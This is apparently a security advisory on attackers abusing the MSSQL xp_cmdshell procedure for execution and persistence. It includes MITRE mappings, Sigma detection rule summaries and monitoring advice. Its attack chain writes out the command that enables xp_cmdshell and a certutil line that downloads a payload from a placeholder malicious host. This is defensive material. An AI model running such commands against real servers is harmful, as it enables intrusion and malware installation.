---
title: MSSQL xp_cmdshell Stored Procedure Abuse for Persistence and Execution
slug: 2024-01-xp-cmdshell-persistence
description: Attackers leverage the MSSQL xp_cmdshell stored procedure to execute arbitrary commands, escalating privileges and establishing persistence on Windows systems.
date: "2024-01-03T14:30:00Z"
type: advisory
types:
  - advisory
severities:
  - medium
tags:
  - mssql
  - xp_cmdshell
  - persistence
  - execution
vendors:
  - Microsoft
products:
  - SQL Server
mitre_ttps:
  - tactic_id: TA0003
    tactic_name: Persistence
    technique_id: T1505
    technique_name: Server Software Component
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
references:
  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
  - https://attack.mitre.org/techniques/T1505/
  - https://attack.mitre.org/techniques/T1059/
rules:
  - title: Detect xp_cmdshell Usage with Suspicious Process
    description: Detects the execution of command interpreters (cmd.exe, powershell.exe) as child processes of sqlservr.exe via xp_cmdshell.
    platform: sigma
    severity: high
    tactics:
      - execution
      - persistence
    techniques:
      - T1059.003
      - T1505.001
    data_sources:
      - process_creation
      - windows
  - title: Detect CertUtil Download via xp_cmdshell
    description: Detects the use of certutil.exe to download files when spawned by sqlservr.exe, indicative of xp_cmdshell abuse.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
      - execution
    techniques:
      - T1059.003
      - T1105
    data_sources:
      - process_creation
      - windows
rules_count: 2
---

Attackers are increasingly targeting MSSQL servers to gain unauthorized access and establish persistence within compromised networks. A common technique involves abusing the `xp_cmdshell` extended stored procedure, a feature that allows executing operating system commands directly from within SQL Server. This procedure is disabled by default, but when enabled, it runs with the security context of the MSSQL Server service account, which often possesses elevated privileges. Once enabled, attackers can leverage `xp_cmdshell` to execute malicious commands, download and execute malware, create rogue user accounts, or exfiltrate sensitive data. This activity can lead to full system compromise and significant data breaches, particularly if the SQL Server has access to critical databases or network resources. Defenders should monitor for attempts to enable and utilize `xp_cmdshell`, as well as unusual process execution originating from the `sqlservr.exe` process.

## Attack Chain

1.  Initial access to the MSSQL server is gained, possibly through credential stuffing or exploiting SQL injection vulnerabilities.
2.  The attacker attempts to enable the `xp_cmdshell` stored procedure using `sp_configure 'xp_cmdshell', 1; RECONFIGURE;`.
3.  The attacker uses `xp_cmdshell` to execute reconnaissance commands such as `whoami` or `net user` to gather information about the system and user privileges.
4.  `xp_cmdshell` is then used to download a malicious payload (e.g., a reverse shell or malware installer) using `certutil.exe -urlcache -f http://malicious.example.com/payload.exe payload.exe`.
5.  The downloaded payload is executed via `xp_cmdshell`, establishing a foothold on the system.
6.  The attacker leverages the compromised system to perform lateral movement within the network, potentially using tools like `bitsadmin.exe`.
7.  Persistence is established by creating a scheduled task or modifying the registry using `xp_cmdshell` to execute a malicious script at regular intervals.
8.  Data exfiltration or other malicious activities are performed, depending on the attacker's objectives.

## Impact

Successful exploitation of `xp_cmdshell` can lead to complete compromise of the SQL Server and the underlying operating system. This allows attackers to steal sensitive data, install ransomware, or use the compromised server as a pivot point for further attacks within the network. Organizations in various sectors have been targeted, including those in finance, healthcare, and government. The consequences of a successful attack can include significant financial losses, reputational damage, and legal liabilities.

## Recommendation

*   Monitor for process creation events where `process.parent.name` is `sqlservr.exe` and `process.name` is `cmd.exe`, `powershell.exe`, `certutil.exe`, or `bitsadmin.exe`, as outlined in the provided rule, to detect potential `xp_cmdshell` abuse.
*   Implement the Sigma rule "Execution via MSSQL xp_cmdshell Stored Procedure" to detect suspicious command execution via `xp_cmdshell`.
*   Disable the `xp_cmdshell` stored procedure unless absolutely necessary, and implement strict access controls if it must be enabled.
*   Review and harden MSSQL server configurations to prevent unauthorized access and privilege escalation, referencing best practices from Microsoft and security organizations.
*   Enable and monitor Windows Security Event Logs, Sysmon, or other endpoint detection and response (EDR) solutions to gain visibility into process execution and other system activities.
